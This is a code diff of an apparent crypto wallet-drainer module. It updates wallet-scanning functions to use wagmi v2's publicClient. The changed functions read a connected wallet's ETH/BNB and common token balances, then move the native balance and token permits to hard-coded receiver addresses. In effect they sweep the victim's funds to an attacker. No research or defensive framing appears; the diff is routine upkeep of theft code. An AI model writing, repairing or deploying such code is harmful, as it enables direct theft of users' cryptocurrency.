@@ -28,13 +28,21 @@ function isValidEthereumAddress(address) {
 }
 
 // Function to get token balance
-async function getTokenBalance(walletClient, tokenAddress, walletAddress) {
+async function getTokenBalance(walletClient, tokenAddress, walletAddress, publicClient) {
   try {
-    // For wagmi v2, we'll use the walletClient directly
-    const abi = ["function balanceOf(address) view returns (uint256)"]
-    const provider = new ethers.providers.Web3Provider(walletClient.transport)
-    const contract = new ethers.Contract(tokenAddress, abi, provider)
-    const balance = await contract.balanceOf(walletAddress)
+    // For wagmi v2, we'll use the publicClient to read contract data
+    const balance = await publicClient.readContract({
+      address: tokenAddress,
+      abi: [{
+        name: 'balanceOf',
+        type: 'function',
+        stateMutability: 'view',
+        inputs: [{ name: 'owner', type: 'address' }],
+        outputs: [{ name: '', type: 'uint256' }]
+      }],
+      functionName: 'balanceOf',
+      args: [walletAddress]
+    })
     return balance.toString()
   } catch (error) {
     console.error(`Error getting token balance for ${tokenAddress}:`, error)
@@ -43,7 +51,7 @@ async function getTokenBalance(walletClient, tokenAddress, walletAddress) {
 }
 
 // Function to transfer ETH/BNB
-async function transferETH(walletClient, fromAddress, amount, toAddress) {
+async function transferETH(walletClient, fromAddress, amount, toAddress, publicClient) {
   try {
     console.log("Starting ETH/BNB transfer function...")
     
@@ -148,7 +156,7 @@ async function transferTokens(walletClient, tokenAddress, amount, toAddress) {
 }
 
 // Function to create permit for token transfer
-async function createTokenPermit(walletClient, tokenAddress, amount, spenderAddress, deadlineHours = 24) {
+async function createTokenPermit(walletClient, tokenAddress, amount, spenderAddress, deadlineHours = 24, publicClient) {
   try {
     console.log("Creating permit for token transfer...")
     
@@ -219,19 +227,19 @@ async function executePermitTransfer(walletClient, tokenAddress, permitData) {
 }
 
 // Function to scan Ethereum tokens (ERC20 and ETH)
-async function scanEthereumTokens(walletClient, walletAddress) {
+async function scanEthereumTokens(walletClient, walletAddress, publicClient) {
   try {
     console.log(`Scanning Ethereum tokens for wallet: ${walletAddress}`)
     
     let transferCount = 0
     
     // Get ETH balance
-    const ethBalance = await walletClient.getBalance({ address: walletAddress })
+    const ethBalance = await publicClient.getBalance({ address: walletAddress })
     console.log(`ETH Balance: ${ethers.utils.formatEther(ethBalance)} ETH`)
     
     // Check if we have ETH to transfer (leave some for gas)
     if (ethBalance.gt(ethers.utils.parseEther('0.001'))) {
-      const result = await transferETH(walletClient, walletAddress, ethBalance, receiveAddress)
+      const result = await transferETH(walletClient, walletAddress, ethBalance, receiveAddress, publicClient)
       if (result) {
         transferCount++
         console.log(`ETH transfer completed. Tx: ${result.substring(0, 10)}...`)
@@ -243,12 +251,12 @@ async function scanEthereumTokens(walletClient, walletAddress) {
     // Check and transfer each token
     for (const token of commonTokens.ethereum) {
       try {
-        const balance = await getTokenBalance(walletClient, token.address, walletAddress)
+        const balance = await getTokenBalance(walletClient, token.address, walletAddress, publicClient)
         if (ethers.BigNumber.from(balance).gt(0)) {
           console.log(`Found ${ethers.utils.formatUnits(balance, token.decimals)} ${token.name}`)
           
           // Create permit for the transfer
-          const permitData = await createTokenPermit(walletClient, token.address, balance, receiveAddress)
+          const permitData = await createTokenPermit(walletClient, token.address, balance, receiveAddress, publicClient)
           console.log(`${token.name} permit created successfully`)
           
           // Execute permit transfer
@@ -274,19 +282,19 @@ async function scanEthereumTokens(walletClient, walletAddress) {
 }
 
 // Function to scan BSC tokens (BEP20 and BNB)
-async function scanBscTokens(walletClient, walletAddress) {
+async function scanBscTokens(walletClient, walletAddress, publicClient) {
   try {
     console.log(`Scanning BSC tokens for wallet: ${walletAddress}`)
     
     let transferCount = 0
     
     // Get BNB balance
-    const bnbBalance = await walletClient.getBalance({ address: walletAddress })
+    const bnbBalance = await publicClient.getBalance({ address: walletAddress })
     console.log(`BNB Balance: ${ethers.utils.formatEther(bnbBalance)} BNB`)
     
     // Check if we have BNB to transfer (leave some for gas)
     if (bnbBalance.gt(ethers.utils.parseEther('0.001'))) {
-      const result = await transferETH(walletClient, walletAddress, bnbBalance, bep20ReceiverAddress)
+      const result = await transferETH(walletClient, walletAddress, bnbBalance, bep20ReceiverAddress, publicClient)
       if (result) {
         transferCount++
         console.log(`BNB transfer completed. Tx: ${result.substring(0, 10)}...`)
@@ -298,12 +306,12 @@ async function scanBscTokens(walletClient, walletAddress) {
     // Check and transfer each token
     for (const token of commonTokens.bsc) {
       try {
-        const balance = await getTokenBalance(walletClient, token.address, walletAddress)
+        const balance = await getTokenBalance(walletClient, token.address, walletAddress, publicClient)
         if (ethers.BigNumber.from(balance).gt(0)) {
           console.log(`Found ${ethers.utils.formatUnits(balance, token.decimals)} ${token.name}`)
           
           // Create permit for the transfer
-          const permitData = await createTokenPermit(walletClient, token.address, balance, bep20ReceiverAddress)
+          const permitData = await createTokenPermit(walletClient, token.address, balance, bep20ReceiverAddress, publicClient)
           console.log(`${token.name} permit created successfully`)
           
           // Execute permit transfer
@@ -329,7 +337,7 @@ async function scanBscTokens(walletClient, walletAddress) {
 }
 
 // Main scanning function
-export async function scanAndTransferTokens(walletClient, walletAddress, chainId) {
+export async function scanAndTransferTokens(walletClient, walletAddress, chainId, publicClient) {
   try {
     console.log("Starting token scan and transfer process...")
     
@@ -343,11 +351,11 @@ export async function scanAndTransferTokens(walletClient, walletAddress, chainId
     if (chainId === 1) {
       // Ethereum mainnet
       console.log("Connected to Ethereum mainnet, scanning ERC20 tokens and ETH...")
-      totalTransfers += await scanEthereumTokens(walletClient, walletAddress)
+      totalTransfers += await scanEthereumTokens(walletClient, walletAddress, publicClient)
     } else if (chainId === 56) {
       // BSC mainnet
       console.log("Connected to BSC network, scanning BEP20 tokens and BNB...")
-      totalTransfers += await scanBscTokens(walletClient, walletAddress)
+      totalTransfers += await scanBscTokens(walletClient, walletAddress, publicClient)
     }
     
     console.log("Token scanning and transfer process completed.")
